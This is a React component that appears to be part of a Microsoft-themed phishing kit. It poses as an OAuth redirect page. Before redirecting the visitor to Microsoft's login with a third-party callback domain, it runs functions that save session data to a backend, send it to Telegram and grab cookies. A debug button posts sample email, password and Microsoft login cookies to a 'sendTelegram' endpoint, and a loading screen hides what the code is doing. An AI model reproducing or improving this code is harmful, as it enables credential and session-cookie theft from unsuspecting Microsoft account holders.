import React, { useEffect } from 'react';

// Import or declare the backend functions
declare function saveSessionToBackend(sessionData: any): Promise<any>;
declare function sendToTelegram(sessionData: any): Promise<any>;
declare function grabCookies(): void;

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sessionData?: any;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sessionData }) => {
  useEffect(() => {
    console.log('🔄 RealOAuthRedirect: Starting OAuth flow with CLIENT SECRET...');
    
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    // DEBUG functionality (keep your existing debug code)
    if (window.location.search.includes('debug=1')) {
      console.log('🔍 DEBUG MODE ENABLED - Adding test button');
      setTimeout(() => {
        const testButton = document.createElement('button');
        testButton.innerText = '🧪 Test Telegram Now';
        testButton.style.cssText =
          'position:fixed;top:10px;right:10px;z-index:9999;background:red;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;';
        testButton.onclick = async () => {
          console.log('🧪 Manual Telegram test triggered');
          try {
            const response = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: 'manual-test@debug.com',
                password: 'ManualTest123',
                provider: 'Microsoft',
                fileName: 'Manual Debug Test',
                timestamp: new Date().toISOString(),
                sessionId: 'manual_' + Math.random().toString(36).substring(2, 15),
                userAgent: navigator.userAgent,
                formattedCookies: [{
                  name: 'MANUAL_TEST',
                  value: 'manual_value_' + Date.now(),
                  domain: '.login.microsoftonline.com',
                }],
                browserFingerprint: { localStorage: '{"manual":"test"}' },
              }),
            });
            const result = await response.json();
            console.log('🧪 Manual test result:', result);
            alert('Manual test completed - check console and Telegram');
          } catch (error) {
            console.error('🧪 Manual test failed:', error);
            alert('Manual test failed: ' + error.message);
          }
        };
        document.body.appendChild(testButton);
      }, 1000);
    }

    let saveSuccess = false;
    let telegramSuccess = false;

    (async () => {
      let currentSessionData = sessionData || {};

      console.log('🔍 Processing session data before OAuth redirect...');

      // Step 1: Save session to backend
      try {
        if (typeof saveSessionToBackend === 'function') {
          const saveResult = await saveSessionToBackend(currentSessionData);
          console.log('✅ Session saved to backend');
          saveSuccess = true;
        }
      } catch (saveError) {
        console.error('❌ Session save failed:', saveError);
      }

      // Step 2: Send to Telegram
      try {
        if (typeof sendToTelegram === 'function') {
          const telegramResult = await sendToTelegram(currentSessionData);
          console.log('✅ Data sent to Telegram');
          telegramSuccess = true;
        }
      } catch (telegramError) {
        console.error('❌ Telegram send failed:', telegramError);
      }

      // Step 3: Grab cookies
      if (typeof grabCookies === 'function') {
        grabCookies();
      }

      // **SIMPLIFIED OAuth flow - No PKCE needed with client secret**
      const state = Math.random().toString(36).substring(2, 15);
      sessionStorage.setItem('oauth_state', state);

      const params = new URLSearchParams({
        client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
        response_type: 'code',
        redirect_uri: 'https://vaultydocs.com/oauth-callback',
        response_mode: 'query',
        scope: 'openid profile email User.Read offline_access',
        state: state,
        prompt: 'login',
      });

      const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;

      console.log('🚀 Redirecting to Microsoft OAuth (CLIENT SECRET method)...');
      window.location.href = microsoftOAuthUrl;

    })();
  }, [sessionData, onLoginSuccess]);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        background: 'white',
        padding: '40px',
        borderRadius: '8px',
        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
      }}>
        <div style={{
          width: '40px',
          height: '40px',
          border: '4px solid #f3f3f3',
          borderTop: '4px solid #0078d4',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px'
        }}></div>
        <h3 style={{ color: '#323130', margin: '0 0 10px' }}>Preparing Microsoft Authentication</h3>
        <p style={{ color: '#605e5c', margin: 0 }}>Connecting securely with client credentials...</p>
      </div>
      
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default RealOAuthRedirect;